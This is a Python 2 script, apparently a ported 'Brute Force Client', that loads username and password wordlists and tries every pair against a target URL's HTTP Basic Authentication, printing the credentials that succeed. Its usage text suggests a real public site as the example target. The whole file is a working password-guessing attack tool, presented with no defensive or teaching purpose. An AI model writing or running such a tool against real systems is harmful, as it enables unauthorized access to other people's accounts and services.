import sys
import re
import urllib2
import httplib
import socket
import HTMLParser
import socket
import base64
import os
import time
from sys import stdout
from threading import Thread
from time import sleep

# patorjk.com
print "      (                    "
print "   (  )\ )       '    )     "
print " ( )\(()/(   ( ` )  /((    "
print " )((_)/(_))  )\ ( )(_))\   "
print "((_)_(_)) _ ((_|_(_()|(_)  "
print " | _ ) _ \ | | |_   _| __| "
print " | _ \   / |_| | | | | _|  "
print " |___/_|_\\_____/ |_| |___| "
print ""
time.sleep(3)

def usage():
        print "\n-+- Usage -+-"
        print "sys.argv[1] = Target Url"
        print "sys.argv[2] = Useranme List"
        print "sys.argv[3] = Password List"
        print ""
        print "-+- Example of Argv -+-"
        print "http://google.com name.txt pass.txt"
        print ""
        print "-+- Credits -+-"
        print "[+] Pythonista Version:"
        print " -  Russian_Otter"
        print ""
        print "[+] Original Version:"
        print " -  phteam"
        return

def basic_auth(host, username, passwd):
    try:
        request = urllib2.Request(host)
        base64string = base64.encodestring('%s:%s' % (username, passwd))[:-1]
        request.add_header("Authorization", "Basic %s" % base64string)   
        result = urllib2.urlopen(request)
        stdout.write('[+]')
        print 'Forcing:\n[USER]: %s\n[PASS]: %s\n' %(username, passwd)
    except: pass
    #except (socket.gaierror, socket.error, IOError) as e: pass

def scan(host, usernames, passwords):
	try:
	  for username in usernames:
	    for pwd in passwords:
	      t = Thread(target=basic_auth, args=(host,username,pwd,))
	      t.start()
	      t.join()
	      stdout.write('')
	      stdout.flush()
	      while(t.isAlive()):
	        time.sleep(0xA)
	except (KeyboardInterrupt, SystemExit):
          raise

def main():
   if len(sys.argv) == 4:
      m_host  = str(sys.argv[1])
      userfile = sys.argv[2]
      passfile = sys.argv[-1]

      print ' -+--=:=- Brute Force Client 1.5.2\n\n[root]: Starting Agent\n[root]: Brute Force\n\'%s\'' % (m_host)
      uwords = open(sys.argv[2], "r").readlines()
      pwords = open(sys.argv[3], "r").readlines()
      print "[Usernames] Loaded:",len(uwords)
      print "[Passwords] Loaded:",len(pwords)
      print ""
      time.sleep(2)

      usernames = []
      passwords = []
      results = None

      if not os.path.isfile(userfile):
        print 'user file not found in \'%s\' on current directory' %(userfile)
        exit()
      if not os.path.isfile(passfile):
        print 'pass file not found in \'%s\' on current directory' %(userfile)
        exit()
      try:
        with open(userfile, 'r') as f: 
          for line in f:
            line = line.strip()
            usernames.append(line)
      except IOError: 
        print 'Error reading users.txt, Please check file if readable/corrupt.'
        exit()

      try:
        with open(passfile, 'r') as f: 
          for line in f:
            line = line.strip()
            passwords.append(line)
      except IOError: 
        print 'Error reading pass.txt, Please check file if readable/corrupt.'
        exit()
      
      if len(usernames) == 0:
        print 'No content(s). Please check users.txt file'
        exit()
      if len(passwords) == 0:
        print 'No content(s). Please check pass.txt file'
        exit()

      thread = Thread(target=scan, args=(m_host,usernames,passwords,))
      thread.start()
      thread.join()
      while(thread.isAlive()):
         sleep(0xA)

      stdout.write('')
      print '\n-+--=:=- Ended Brute Force\n\n'
   else:
     usage()

if __name__ == '__main__':
  main()
